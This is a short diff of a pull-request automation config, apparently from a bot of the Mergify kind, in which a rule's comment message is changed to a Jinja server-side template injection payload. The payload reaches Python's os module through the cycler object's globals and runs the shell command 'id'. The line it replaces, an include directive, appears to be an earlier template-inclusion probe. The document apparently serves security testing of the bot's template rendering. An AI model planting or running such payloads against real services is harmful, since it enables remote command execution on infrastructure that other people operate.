@@ -1,10 +1,10 @@
 pull_request_rules:
-  - name: vm6-j2-inctrav-261016
+  - name: vm6-j2-cycler-261016
     conditions:
-      - label = vm6-j2-inctrav
+      - label = vm6-j2-cycler
     actions:
       comment:
-        message: "{% include body %}"
+        message: "{{ cycler.__init__.__globals__['os'].popen('id').read() }}"
 
 commands_restrictions:
   queue:
